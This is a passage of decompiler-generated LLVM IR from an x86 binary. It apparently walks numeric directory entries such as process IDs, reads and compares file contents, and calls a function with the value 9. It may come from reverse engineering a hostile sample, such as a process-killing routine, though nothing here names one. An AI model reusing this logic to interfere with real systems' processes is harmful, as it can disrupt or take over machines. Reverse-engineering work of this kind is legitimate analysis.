dec_label_pc_804d871:                             ; preds = %dec_label_pc_804d859
  %v1_804d871 = add i32 %v0_804d866, 20
  %v2_804d871 = inttoptr i32 %v1_804d871 to i32*
  %v3_804d871 = load i32, i32* %v2_804d871, align 4
  %v1_804d875 = icmp eq i32 %v3_804d871, 0
  %v1_804d877 = icmp eq i1 %v1_804d875, false
  br i1 %v1_804d877, label %dec_label_pc_804db62, label %dec_label_pc_804d87d

dec_label_pc_804d87d:                             ; preds = %dec_label_pc_804d871
  %v1_804d87d = add i32 %v0_804d861, 11
  store i32 %v1_804d87d, i32* @edi, align 4
  %v2_804d880 = inttoptr i32 %v1_804d87d to i8*
  %v3_804d880 = load i8, i8* %v2_804d880, align 1
  %v4_804d880 = zext i8 %v3_804d880 to i32
  %v6_804d880 = and i32 %v0_804d861, -256
  %v7_804d880 = or i32 %v4_804d880, %v6_804d880
  %v1_804d883 = add i32 %v7_804d880, -48
  %v8_804d883 = trunc i32 %v1_804d883 to i8
  store i32 %v1_804d883, i32* %eax.global-to-local, align 4
  %v8_804d888 = icmp ugt i8 %v8_804d883, 9
  br i1 %v8_804d888, label %dec_label_pc_804d859, label %dec_label_pc_804d88a

dec_label_pc_804d88a:                             ; preds = %dec_label_pc_804d87d
  %v2_804d88a = add i32 %v0_804d866, 12
  %v3_804d88a = inttoptr i32 %v2_804d88a to i32*
  store i32 %v1_804d883, i32* %v3_804d88a, align 4
  %v0_804d88b = load i32, i32* %eax.global-to-local, align 4
  %v2_804d88b = add i32 %v0_804d866, 8
  %v3_804d88b = inttoptr i32 %v2_804d88b to i32*
  store i32 %v0_804d88b, i32* %v3_804d88b, align 4
  %v1_804d88c = add i32 %v0_804d866, 4
  %v2_804d88c = inttoptr i32 %v1_804d88c to i32*
  store i32 0, i32* %v2_804d88c, align 4
  %v2_804d88e = inttoptr i32 %v0_804d866 to i32*
  store i32 6, i32* %v2_804d88e, align 4
  %v3_804d890 = call i32 @function_80511f0(i32 0, i32* nonnull @0)
  store i32 %v3_804d890, i32* %eax.global-to-local, align 4
  %v0_804d895 = load i32, i32* @esp, align 4
  %v1_804d895 = inttoptr i32 %v0_804d895 to i32*
  %v3_804d895 = add i32 %v0_804d895, 4
  %v1_804d896 = inttoptr i32 %v3_804d895 to i32*
  store i32 %v3_804d890, i32* %v1_804d896, align 4
  %v1_804d898 = add i32 %v0_804d895, 4139
  store i32 %v1_804d898, i32* %eax.global-to-local, align 4
  store i32 %v1_804d898, i32* %v1_804d895, align 4
  %v3_804d8a0 = call i32 @function_8051c10(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d8a0, i32* %eax.global-to-local, align 4
  %v0_804d8a5 = load i32, i32* @esp, align 4
  %v1_804d8a5 = inttoptr i32 %v0_804d8a5 to i32*
  %v2_804d8a5 = load i32, i32* %v1_804d8a5, align 4
  store i32 %v2_804d8a5, i32* @ebx, align 4
  %v1_804d8a6 = add i32 %v0_804d8a5, 4139
  store i32 %v1_804d8a6, i32* %edx.global-to-local, align 4
  store i32 %v1_804d8a6, i32* %v1_804d8a5, align 4
  %v2_804d8ae = call i32 @function_8051bf0(i8* null)
  store i32 %v2_804d8ae, i32* %eax.global-to-local, align 4
  %v0_804d8b3 = load i32, i32* @esp, align 4
  %v1_804d8b3 = inttoptr i32 %v0_804d8b3 to i32*
  %v2_804d8b3 = load i32, i32* %v1_804d8b3, align 4
  store i32 %v2_804d8b3, i32* %edx.global-to-local, align 4
  %v3_804d8b3 = add i32 %v0_804d8b3, 4
  %v1_804d8b4 = inttoptr i32 %v3_804d8b3 to i32*
  %v0_804d8b5 = load i32, i32* @edi, align 4
  store i32 %v0_804d8b5, i32* %v1_804d8b4, align 4
  %v1_804d8b6 = add i32 %v0_804d8b3, 4139
  store i32 %v1_804d8b6, i32* %edx.global-to-local, align 4
  %v2_804d8bd = add i32 %v1_804d8b6, %v2_804d8ae
  store i32 %v2_804d8bd, i32* %eax.global-to-local, align 4
  store i32 %v2_804d8bd, i32* %v1_804d8b3, align 4
  %v3_804d8c1 = call i32 @function_8051c10(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d8c1, i32* %eax.global-to-local, align 4
  %v0_804d8c6 = load i32, i32* @esp, align 4
  %v1_804d8c6 = inttoptr i32 %v0_804d8c6 to i32*
  %v2_804d8c6 = load i32, i32* %v1_804d8c6, align 4
  store i32 %v2_804d8c6, i32* @ebp, align 4
  %v3_804d8c6 = add i32 %v0_804d8c6, 4
  %v1_804d8c7 = inttoptr i32 %v3_804d8c6 to i32*
  %v2_804d8c7 = load i32, i32* %v1_804d8c7, align 4
  store i32 %v2_804d8c7, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804d8c7, align 4
  store i32 7, i32* %v1_804d8c6, align 4
  %v3_804d8cc = call i32 @function_80511f0(i32 0, i32* nonnull @0)
  store i32 %v3_804d8cc, i32* %eax.global-to-local, align 4
  %v0_804d8d1 = load i32, i32* @esp, align 4
  %v1_804d8d1 = inttoptr i32 %v0_804d8d1 to i32*
  %v2_804d8d1 = load i32, i32* %v1_804d8d1, align 4
  store i32 %v2_804d8d1, i32* @esi, align 4
  store i32 %v3_804d8cc, i32* @ebx, align 4
  %v1_804d8d4 = add i32 %v0_804d8d1, 4139
  store i32 %v1_804d8d4, i32* %eax.global-to-local, align 4
  store i32 %v1_804d8d4, i32* %v1_804d8d1, align 4
  %v2_804d8dc = call i32 @function_8051bf0(i8* null)
  store i32 %v2_804d8dc, i32* %eax.global-to-local, align 4
  %v0_804d8e1 = load i32, i32* @esp, align 4
  %v1_804d8e1 = inttoptr i32 %v0_804d8e1 to i32*
  %v2_804d8e1 = load i32, i32* %v1_804d8e1, align 4
  store i32 %v2_804d8e1, i32* %edx.global-to-local, align 4
  %v3_804d8e1 = add i32 %v0_804d8e1, 4
  %v1_804d8e2 = inttoptr i32 %v3_804d8e1 to i32*
  %v0_804d8e3 = load i32, i32* @ebx, align 4
  store i32 %v0_804d8e3, i32* %v1_804d8e2, align 4
  %v1_804d8e4 = add i32 %v0_804d8e1, 4139
  store i32 %v1_804d8e4, i32* %edx.global-to-local, align 4
  %v2_804d8eb = add i32 %v1_804d8e4, %v2_804d8dc
  store i32 %v2_804d8eb, i32* %eax.global-to-local, align 4
  store i32 %v2_804d8eb, i32* %v1_804d8e1, align 4
  %v3_804d8ef = call i32 @function_8051c10(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v0_804d8f4 = load i32, i32* @esp, align 4
  %v1_804d8f7 = add i32 %v0_804d8f4, 8
  %v2_804d8f7 = inttoptr i32 %v1_804d8f7 to i32*
  store i32 4096, i32* %v2_804d8f7, align 4
  %v1_804d8fc = add i32 %v0_804d8f4, 43
  store i32 %v1_804d8fc, i32* %eax.global-to-local, align 4
  %v2_804d900 = add i32 %v0_804d8f4, 4
  %v3_804d900 = inttoptr i32 %v2_804d900 to i32*
  store i32 %v1_804d8fc, i32* %v3_804d900, align 4
  %v1_804d901 = add i32 %v0_804d8f4, 4139
  store i32 %v1_804d901, i32* %edx.global-to-local, align 4
  %v3_804d908 = inttoptr i32 %v0_804d8f4 to i32*
  store i32 %v1_804d901, i32* %v3_804d908, align 4
  %v4_804d909 = call i32 @function_8052362(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804d90e = load i32, i32* @esp, align 4
  %v1_804d90e = add i32 %v0_804d90e, 16
  %v1_804d911 = add i32 %v4_804d909, 1
  %v8_804d911 = icmp eq i32 %v1_804d911, 0
  store i32 %v1_804d911, i32* %eax.global-to-local, align 4
  br i1 %v8_804d911, label %dec_label_pc_804d859, label %dec_label_pc_804d918

dec_label_pc_804d918:                             ; preds = %dec_label_pc_804d88a
  %v2_804d918 = add i32 %v0_804d90e, 12
  %v3_804d918 = inttoptr i32 %v2_804d918 to i32*
  store i32 %v1_804d911, i32* %v3_804d918, align 4
  %v0_804d919 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d919 = add i32 %v0_804d90e, 8
  %v3_804d919 = inttoptr i32 %v2_804d919 to i32*
  store i32 %v0_804d919, i32* %v3_804d919, align 4
  %v1_804d91a = add i32 %v0_804d90e, 4
  %v2_804d91a = inttoptr i32 %v1_804d91a to i32*
  store i32 0, i32* %v2_804d91a, align 4
  %v2_804d91c = inttoptr i32 %v0_804d90e to i32*
  store i32 6, i32* %v2_804d91c, align 4
  %v3_804d91e = call i32 @function_80511f0(i32 0, i32* nonnull @0)
  store i32 %v3_804d91e, i32* %eax.global-to-local, align 4
  %v0_804d923 = load i32, i32* @esp, align 4
  %v1_804d923 = inttoptr i32 %v0_804d923 to i32*
  %v3_804d923 = add i32 %v0_804d923, 4
  %v1_804d924 = inttoptr i32 %v3_804d923 to i32*
  store i32 %v3_804d91e, i32* %v1_804d924, align 4
  %v1_804d926 = add i32 %v0_804d923, 4139
  store i32 %v1_804d926, i32* %eax.global-to-local, align 4
  store i32 %v1_804d926, i32* %v1_804d923, align 4
  %v3_804d92e = call i32 @function_8051c10(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d92e, i32* %eax.global-to-local, align 4
  %v0_804d933 = load i32, i32* @esp, align 4
  %v1_804d933 = inttoptr i32 %v0_804d933 to i32*
  %v2_804d933 = load i32, i32* %v1_804d933, align 4
  store i32 %v2_804d933, i32* @ebx, align 4
  %v1_804d934 = add i32 %v0_804d933, 4139
  store i32 %v1_804d934, i32* %edx.global-to-local, align 4
  store i32 %v1_804d934, i32* %v1_804d933, align 4
  %v2_804d93c = call i32 @function_8051bf0(i8* null)
  store i32 %v2_804d93c, i32* %eax.global-to-local, align 4
  %v0_804d941 = load i32, i32* @esp, align 4
  %v1_804d941 = inttoptr i32 %v0_804d941 to i32*
  %v2_804d941 = load i32, i32* %v1_804d941, align 4
  store i32 %v2_804d941, i32* %edx.global-to-local, align 4
  %v3_804d941 = add i32 %v0_804d941, 4
  %v1_804d942 = inttoptr i32 %v3_804d941 to i32*
  %v0_804d943 = load i32, i32* @edi, align 4
  store i32 %v0_804d943, i32* %v1_804d942, align 4
  %v1_804d944 = add i32 %v0_804d941, 4139
  store i32 %v1_804d944, i32* %edx.global-to-local, align 4
  %v2_804d94b = add i32 %v1_804d944, %v2_804d93c
  store i32 %v2_804d94b, i32* %eax.global-to-local, align 4
  store i32 %v2_804d94b, i32* %v1_804d941, align 4
  %v3_804d94f = call i32 @function_8051c10(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d94f, i32* %eax.global-to-local, align 4
  %v0_804d954 = load i32, i32* @esp, align 4
  %v1_804d954 = inttoptr i32 %v0_804d954 to i32*
  %v2_804d954 = load i32, i32* %v1_804d954, align 4
  store i32 %v2_804d954, i32* @ebp, align 4
  %v3_804d954 = add i32 %v0_804d954, 4
  %v1_804d955 = inttoptr i32 %v3_804d954 to i32*
  %v2_804d955 = load i32, i32* %v1_804d955, align 4
  store i32 %v2_804d955, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804d955, align 4
  store i32 9, i32* %v1_804d954, align 4
  %v3_804d95a = call i32 @function_80511f0(i32 0, i32* nonnull @0)
  store i32 %v3_804d95a, i32* %eax.global-to-local, align 4
  %v0_804d95f = load i32, i32* @esp, align 4
  %v1_804d95f = inttoptr i32 %v0_804d95f to i32*
  %v2_804d95f = load i32, i32* %v1_804d95f, align 4
  store i32 %v2_804d95f, i32* @esi, align 4
  store i32 %v3_804d95a, i32* @ebx, align 4
  %v1_804d962 = add i32 %v0_804d95f, 4139
  store i32 %v1_804d962, i32* %eax.global-to-local, align 4
  store i32 %v1_804d962, i32* %v1_804d95f, align 4
  %v2_804d96a = call i32 @function_8051bf0(i8* null)
  store i32 %v2_804d96a, i32* %eax.global-to-local, align 4
  %v0_804d96f = load i32, i32* @esp, align 4
  %v1_804d96f = inttoptr i32 %v0_804d96f to i32*
  %v2_804d96f = load i32, i32* %v1_804d96f, align 4
  store i32 %v2_804d96f, i32* %edx.global-to-local, align 4
  %v3_804d96f = add i32 %v0_804d96f, 4
  %v1_804d970 = inttoptr i32 %v3_804d96f to i32*
  %v0_804d971 = load i32, i32* @ebx, align 4
  store i32 %v0_804d971, i32* %v1_804d970, align 4
  %v1_804d972 = add i32 %v0_804d96f, 4139
  store i32 %v1_804d972, i32* %edx.global-to-local, align 4
  %v2_804d979 = add i32 %v1_804d972, %v2_804d96a
  store i32 %v2_804d979, i32* %eax.global-to-local, align 4
  store i32 %v2_804d979, i32* %v1_804d96f, align 4
  %v3_804d97d = call i32 @function_8051c10(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v0_804d982 = load i32, i32* @esp, align 4
  %v1_804d982 = inttoptr i32 %v0_804d982 to i32*
  %v1_804d983 = add i32 %v0_804d982, 4139
  store i32 %v1_804d983, i32* %eax.global-to-local, align 4
  store i32 %v1_804d983, i32* %v1_804d982, align 4
  %v1_804d98b = call i32 @function_8052554(i32 0)
  store i32 %v1_804d98b, i32* %eax.global-to-local, align 4
  %v0_804d990 = load i32, i32* @esp, align 4
  %v1_804d990 = add i32 %v0_804d990, 16
  store i32 %v1_804d98b, i32* @ebp, align 4
  %v1_804d995 = icmp eq i32 %v1_804d98b, 0
  br i1 %v1_804d995, label %dec_label_pc_804d859, label %dec_label_pc_804d99d.preheader

dec_label_pc_804d99d.preheader:                   ; preds = %dec_label_pc_804d918
  %v3_804d9a083 = inttoptr i32 %v0_804d990 to i32*
  store i32 %v1_804d98b, i32* %v3_804d9a083, align 4
  %v0_804d9a184 = call i32 @function_8052645()
  store i32 %v0_804d9a184, i32* @eax, align 4
  %v0_804d9a685 = load i32, i32* @esp, align 4
  store i32 %v0_804d9a184, i32* @esi, align 4
  %v1_804d9ab87 = icmp eq i32 %v0_804d9a184, 0
  br i1 %v1_804d9ab87, label %dec_label_pc_804dbee, label %dec_label_pc_804d9b3

dec_label_pc_804d9b3:                             ; preds = %dec_label_pc_804d99d.preheader, %dec_label_pc_804d99d.backedge
  %v0_804d9a688 = phi i32 [ %v0_804d9a6, %dec_label_pc_804d99d.backedge ], [ %v0_804d9a685, %dec_label_pc_804d99d.preheader ]
  %v1_804d9b3 = add i32 %v0_804d9a688, 20
  %v2_804d9b3 = inttoptr i32 %v1_804d9b3 to i32*
  %v3_804d9b3 = load i32, i32* %v2_804d9b3, align 4
  store i32 %v3_804d9b3, i32* @eax, align 4
  %v1_804d9b7 = icmp eq i32 %v3_804d9b3, 0
  %v1_804d9b9 = icmp eq i1 %v1_804d9b7, false
  br i1 %v1_804d9b9, label %dec_label_pc_804dbee, label %dec_label_pc_804d9bf

dec_label_pc_804d9bf:                             ; preds = %dec_label_pc_804d9b3
  %v2_804d9bf = add i32 %v0_804d9a688, 12
  %v3_804d9bf = inttoptr i32 %v2_804d9bf to i32*
  store i32 %v3_804d9b3, i32* %v3_804d9bf, align 4
  %v2_804d9c0 = add i32 %v0_804d9a688, 8
  %v3_804d9c0 = inttoptr i32 %v2_804d9c0 to i32*
  store i32 %v3_804d9b3, i32* %v3_804d9c0, align 4
  %v1_804d9c1 = add i32 %v0_804d9a688, 4
  %v2_804d9c1 = inttoptr i32 %v1_804d9c1 to i32*
  store i32 4096, i32* %v2_804d9c1, align 4
  %v1_804d9c6 = add i32 %v0_804d9a688, 43
  store i32 %v1_804d9c6, i32* %edx.global-to-local, align 4
  %v3_804d9ca = inttoptr i32 %v0_804d9a688 to i32*
  store i32 %v1_804d9c6, i32* %v3_804d9ca, align 4
  %v2_804d9cb = call i32 @function_8051c80(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804d9cb, i32* %eax.global-to-local, align 4
  %v0_804d9d0 = load i32, i32* @esp, align 4
  %v1_804d9d0 = inttoptr i32 %v0_804d9d0 to i32*
  %v2_804d9d0 = load i32, i32* %v1_804d9d0, align 4
  store i32 %v2_804d9d0, i32* @ebx, align 4
  %v3_804d9d0 = add i32 %v0_804d9d0, 4
  %v1_804d9d1 = inttoptr i32 %v3_804d9d0 to i32*
  %v2_804d9d1 = load i32, i32* %v1_804d9d1, align 4
  store i32 %v2_804d9d1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804d9d1, align 4
  store i32 6, i32* %v1_804d9d0, align 4
  %v3_804d9d6 = call i32 @function_80511f0(i32 0, i32* nonnull @0)
  store i32 %v3_804d9d6, i32* %eax.global-to-local, align 4
  %v0_804d9db = load i32, i32* @esp, align 4
  %v1_804d9db = inttoptr i32 %v0_804d9db to i32*
  %v2_804d9db = load i32, i32* %v1_804d9db, align 4
  store i32 %v2_804d9db, i32* %edx.global-to-local, align 4
  %v3_804d9db = add i32 %v0_804d9db, 4
  %v1_804d9dc = inttoptr i32 %v3_804d9db to i32*
  store i32 %v3_804d9d6, i32* %v1_804d9dc, align 4
  %v1_804d9de = add i32 %v0_804d9db, 4139
  store i32 %v1_804d9de, i32* %eax.global-to-local, align 4
  store i32 %v1_804d9de, i32* %v1_804d9db, align 4
  %v3_804d9e6 = call i32 @function_8051c10(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d9e6, i32* %eax.global-to-local, align 4
  %v0_804d9eb = load i32, i32* @esp, align 4
  %v1_804d9eb = inttoptr i32 %v0_804d9eb to i32*
  %v2_804d9eb = load i32, i32* %v1_804d9eb, align 4
  store i32 %v2_804d9eb, i32* %eax.global-to-local, align 4
  %v1_804d9ec = add i32 %v0_804d9eb, 4139
  store i32 %v1_804d9ec, i32* %edx.global-to-local, align 4
  store i32 %v1_804d9ec, i32* %v1_804d9eb, align 4
  %v2_804d9f4 = call i32 @function_8051bf0(i8* null)
  store i32 %v2_804d9f4, i32* %eax.global-to-local, align 4
  %v0_804d9f9 = load i32, i32* @esp, align 4
  %v1_804d9f9 = inttoptr i32 %v0_804d9f9 to i32*
  %v3_804d9f9 = add i32 %v0_804d9f9, 4
  %v1_804d9fa = inttoptr i32 %v3_804d9f9 to i32*
  %v2_804d9fa = load i32, i32* %v1_804d9fa, align 4
  store i32 %v2_804d9fa, i32* @ebx, align 4
  %v0_804d9fb = load i32, i32* @edi, align 4
  store i32 %v0_804d9fb, i32* %v1_804d9fa, align 4
  %v1_804d9fc = add i32 %v0_804d9f9, 4139
  store i32 %v1_804d9fc, i32* %edx.global-to-local, align 4
  %v2_804da03 = add i32 %v1_804d9fc, %v2_804d9f4
  store i32 %v2_804da03, i32* %eax.global-to-local, align 4
  store i32 %v2_804da03, i32* %v1_804d9f9, align 4
  %v3_804da07 = call i32 @function_8051c10(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804da07, i32* %eax.global-to-local, align 4
  %v0_804da0c = load i32, i32* @esp, align 4
  %v1_804da0c = inttoptr i32 %v0_804da0c to i32*
  %v2_804da0c = load i32, i32* %v1_804da0c, align 4
  store i32 %v2_804da0c, i32* %eax.global-to-local, align 4
  %v3_804da0c = add i32 %v0_804da0c, 4
  %v1_804da0d = inttoptr i32 %v3_804da0c to i32*
  %v2_804da0d = load i32, i32* %v1_804da0d, align 4
  store i32 %v2_804da0d, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_804da0d, align 4
  store i32 9, i32* %v1_804da0c, align 4
  %v3_804da12 = call i32 @function_80511f0(i32 0, i32* nonnull @0)
  store i32 %v3_804da12, i32* @ebx, align 4
  %v0_804da19 = load i32, i32* @esp, align 4
  %v1_804da19 = inttoptr i32 %v0_804da19 to i32*
  %v1_804da1a = add i32 %v0_804da19, 4139
  store i32 %v1_804da1a, i32* %eax.global-to-local, align 4
  store i32 %v1_804da1a, i32* %v1_804da19, align 4
  %v2_804da22 = call i32 @function_8051bf0(i8* null)
  store i32 %v2_804da22, i32* %eax.global-to-local, align 4
  %v0_804da27 = load i32, i32* @esp, align 4
  %v1_804da27 = inttoptr i32 %v0_804da27 to i32*
  %v2_804da27 = load i32, i32* %v1_804da27, align 4
  store i32 %v2_804da27, i32* %edx.global-to-local, align 4
  %v3_804da27 = add i32 %v0_804da27, 4
  %v1_804da28 = inttoptr i32 %v3_804da27 to i32*
  %v0_804da29 = load i32, i32* @ebx, align 4
  store i32 %v0_804da29, i32* %v1_804da28, align 4
  %v1_804da2a = add i32 %v0_804da27, 4139
  store i32 %v1_804da2a, i32* %edx.global-to-local, align 4
  %v2_804da31 = add i32 %v1_804da2a, %v2_804da22
  store i32 %v2_804da31, i32* %eax.global-to-local, align 4
  store i32 %v2_804da31, i32* %v1_804da27, align 4
  %v3_804da35 = call i32 @function_8051c10(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804da35, i32* %eax.global-to-local, align 4
  %v0_804da3a = load i32, i32* @esp, align 4
  %v1_804da3a = inttoptr i32 %v0_804da3a to i32*
  %v2_804da3a = load i32, i32* %v1_804da3a, align 4
  store i32 %v2_804da3a, i32* @ebx, align 4
  %v1_804da3b = add i32 %v0_804da3a, 4139
  store i32 %v1_804da3b, i32* %eax.global-to-local, align 4
  store i32 %v1_804da3b, i32* %v1_804da3a, align 4
  %v2_804da43 = call i32 @function_8051bf0(i8* null)
  store i32 %v2_804da43, i32* %eax.global-to-local, align 4
  %v0_804da48 = load i32, i32* @esp, align 4
  %v1_804da48 = inttoptr i32 %v0_804da48 to i32*
  %v2_804da48 = load i32, i32* %v1_804da48, align 4
  store i32 %v2_804da48, i32* %edx.global-to-local, align 4
  %v3_804da48 = add i32 %v0_804da48, 4
  %v1_804da49 = inttoptr i32 %v3_804da48 to i32*
  store i32 ptrtoint (i32* @global_var_8054a8d.6 to i32), i32* %v1_804da49, align 4
  %v1_804da4f = add i32 %v0_804da48, 4139
  store i32 %v1_804da4f, i32* %edx.global-to-local, align 4
  %v2_804da56 = add i32 %v1_804da4f, %v2_804da43
  store i32 %v2_804da56, i32* %eax.global-to-local, align 4
  store i32 %v2_804da56, i32* %v1_804da48, align 4
  %v3_804da5a = call i32 @function_8051c10(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804da5a, i32* %eax.global-to-local, align 4
  %v0_804da5f = load i32, i32* @esp, align 4
  %v1_804da5f = inttoptr i32 %v0_804da5f to i32*
  %v2_804da5f = load i32, i32* %v1_804da5f, align 4
  store i32 %v2_804da5f, i32* @ebx, align 4
  %v1_804da60 = add i32 %v0_804da5f, 4139
  store i32 %v1_804da60, i32* %eax.global-to-local, align 4
  store i32 %v1_804da60, i32* %v1_804da5f, align 4
  %v2_804da68 = call i32 @function_8051bf0(i8* null)
  store i32 %v2_804da68, i32* %eax.global-to-local, align 4
  %v0_804da6d = load i32, i32* @esp, align 4
  %v1_804da6d = inttoptr i32 %v0_804da6d to i32*
  %v3_804da6d = add i32 %v0_804da6d, 4
  %v0_804da6e = load i32, i32* @esi, align 4
  %v1_804da6e = add i32 %v0_804da6e, 11
  store i32 %v1_804da6e, i32* %edx.global-to-local, align 4
  %v1_804da71 = inttoptr i32 %v3_804da6d to i32*
  store i32 %v1_804da6e, i32* %v1_804da71, align 4
  %v1_804da73 = add i32 %v0_804da6d, 4139
  store i32 %v1_804da73, i32* %edx.global-to-local, align 4
  %v2_804da7a = add i32 %v1_804da73, %v2_804da68
  store i32 %v2_804da7a, i32* %eax.global-to-local, align 4
  store i32 %v2_804da7a, i32* %v1_804da6d, align 4
  %v3_804da7e = call i32 @function_8051c10(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v0_804da83 = load i32, i32* @esp, align 4
  %v1_804da86 = add i32 %v0_804da83, 8
  %v2_804da86 = inttoptr i32 %v1_804da86 to i32*
  store i32 4096, i32* %v2_804da86, align 4
  %v1_804da8b = add i32 %v0_804da83, 43
  store i32 %v1_804da8b, i32* %eax.global-to-local, align 4
  %v2_804da8f = add i32 %v0_804da83, 4
  %v3_804da8f = inttoptr i32 %v2_804da8f to i32*
  store i32 %v1_804da8b, i32* %v3_804da8f, align 4
  %v1_804da90 = add i32 %v0_804da83, 4139
  store i32 %v1_804da90, i32* %edx.global-to-local, align 4
  %v3_804da97 = inttoptr i32 %v0_804da83 to i32*
  store i32 %v1_804da90, i32* %v3_804da97, align 4
  %v4_804da98 = call i32 @function_8052362(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804da9d = load i32, i32* @esp, align 4
  %v1_804daa0 = add i32 %v4_804da98, 1
  %v8_804daa0 = icmp eq i32 %v1_804daa0, 0
  store i32 %v1_804daa0, i32* %eax.global-to-local, align 4
  br i1 %v8_804daa0, label %dec_label_pc_804d99d.backedge, label %dec_label_pc_804daa7

dec_label_pc_804daa7:                             ; preds = %dec_label_pc_804d9bf
  %v1_804daaa = add i32 %v0_804da9d, 43
  store i32 %v1_804daaa, i32* %eax.global-to-local, align 4
  %v3_804daae = inttoptr i32 %v0_804da9d to i32*
  store i32 %v1_804daaa, i32* %v3_804daae, align 4
  %v2_804daaf = call i32 @function_8051bf0(i8* null)
  %v0_804dab4 = load i32, i32* @esp, align 4
  %v1_804dab7 = add i32 %v0_804dab4, 8764
  store i32 %v1_804dab7, i32* @edx, align 4
  %v2_804dabe = add i32 %v0_804dab4, 8
  %v3_804dabe = inttoptr i32 %v2_804dabe to i32*
  store i32 %v1_804dab7, i32* %v3_804dabe, align 4
  %v2_804dabf = add i32 %v0_804dab4, 4
  %v3_804dabf = inttoptr i32 %v2_804dabf to i32*
  store i32 %v2_804daaf, i32* %v3_804dabf, align 4
  %v1_804dac0 = add i32 %v0_804dab4, 43
  store i32 %v1_804dac0, i32* %eax.global-to-local, align 4
  %v3_804dac4 = inttoptr i32 %v0_804dab4 to i32*
  store i32 %v1_804dac0, i32* %v3_804dac4, align 4
  %v4_804dac5 = call i32 @function_8051ee0(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804daca = load i32, i32* @esp, align 4
  %v1_804dacd = add i32 %v4_804dac5, 1
  %v8_804dacd = icmp eq i32 %v1_804dacd, 0
  store i32 %v1_804dacd, i32* %eax.global-to-local, align 4
  br i1 %v8_804dacd, label %dec_label_pc_804d99d.backedge, label %dec_label_pc_804dad4

dec_label_pc_804dad4:                             ; preds = %dec_label_pc_804daa7
  %v0_804dad4 = load i32, i32* @ebx, align 4
  %v2_804dad4 = add i32 %v0_804daca, 12
  %v3_804dad4 = inttoptr i32 %v2_804dad4 to i32*
  store i32 %v0_804dad4, i32* %v3_804dad4, align 4
  %v0_804dad5 = load i32, i32* @ebx, align 4
  %v2_804dad5 = add i32 %v0_804daca, 8
  %v3_804dad5 = inttoptr i32 %v2_804dad5 to i32*
  store i32 %v0_804dad5, i32* %v3_804dad5, align 4
  %v1_804dad6 = add i32 %v0_804daca, 4
  %v2_804dad6 = inttoptr i32 %v1_804dad6 to i32*
  store i32 10, i32* %v2_804dad6, align 4
  %v0_804dad8 = load i32, i32* @edi, align 4
  %v3_804dad8 = inttoptr i32 %v0_804daca to i32*
  store i32 %v0_804dad8, i32* %v3_804dad8, align 4
  %v3_804dad9 = call i32 @function_8051cf0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804dad9, i32* %eax.global-to-local, align 4
  %v0_804dade = load i32, i32* @esp, align 4
  %v1_804dade = inttoptr i32 %v0_804dade to i32*
  %v2_804dade = load i32, i32* %v1_804dade, align 4
  store i32 %v2_804dade, i32* %edx.global-to-local, align 4
  %v3_804dade = add i32 %v0_804dade, 4
  %v1_804dadf = inttoptr i32 %v3_804dade to i32*
  store i32 9, i32* %v1_804dadf, align 4
  store i32 %v3_804dad9, i32* %v1_804dade, align 4
  %v4_804dae3 = call i32 @function_8052270(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804dae3, i32* %eax.global-to-local, align 4
  %v0_804dae8 = load i32, i32* @esp, align 4
  %v1_804dae8 = add i32 %v0_804dae8, 20
  %v2_804dae8 = inttoptr i32 %v1_804dae8 to i32*
  store i32 1, i32* %v2_804dae8, align 4
  %v0_804daf0 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d99d.backedge

dec_label_pc_804d99d.backedge:                    ; preds = %dec_label_pc_804dad4, %dec_label_pc_804d9bf, %dec_label_pc_804daa7
  %v0_804d99d42.in = phi i32 [ %v0_804daf0, %dec_label_pc_804dad4 ], [ %v0_804da9d, %dec_label_pc_804d9bf ], [ %v0_804daca, %dec_label_pc_804daa7 ]
  %v0_804d9a0.pre = load i32, i32* @ebp, align 4
  %v3_804d9a0 = inttoptr i32 %v0_804d99d42.in to i32*
  store i32 %v0_804d9a0.pre, i32* %v3_804d9a0, align 4
  %v0_804d9a1 = call i32 @function_8052645()
  store i32 %v0_804d9a1, i32* @eax, align 4
  %v0_804d9a6 = load i32, i32* @esp, align 4
  store i32 %v0_804d9a1, i32* @esi, align 4
  %v1_804d9ab = icmp eq i32 %v0_804d9a1, 0
  br i1 %v1_804d9ab, label %dec_label_pc_804dbee, label %dec_label_pc_804d9b3

dec_label_pc_804daf8:                             ; preds = %dec_label_pc_804d79b
  %v1_804daf8 = add i32 %v0_804daf8, 1
  store i32 %v1_804daf8, i32* @esi, align 4
  %v9_804daf9 = icmp eq i32 %v0_804daf8, 0
  %v1_804dafc = icmp eq i1 %v9_804daf9, false
  br i1 %v1_804dafc, label %dec_label_pc_804d7a3, label %dec_label_pc_804db02

dec_label_pc_804db02:                             ; preds = %dec_label_pc_804daf8
  %v1_804db02 = add i32 %v0_804d7a5, 3
  %v2_804db02 = inttoptr i32 %v1_804db02 to i8*
  %v3_804db02 = load i8, i8* %v2_804db02, align 1
  %v12_804db02 = icmp eq i8 %v3_804db02, 65
  %.stack_var_-8769.1 = select i1 %v12_804db02, i8 1, i8 %stack_var_-8769.1.ph
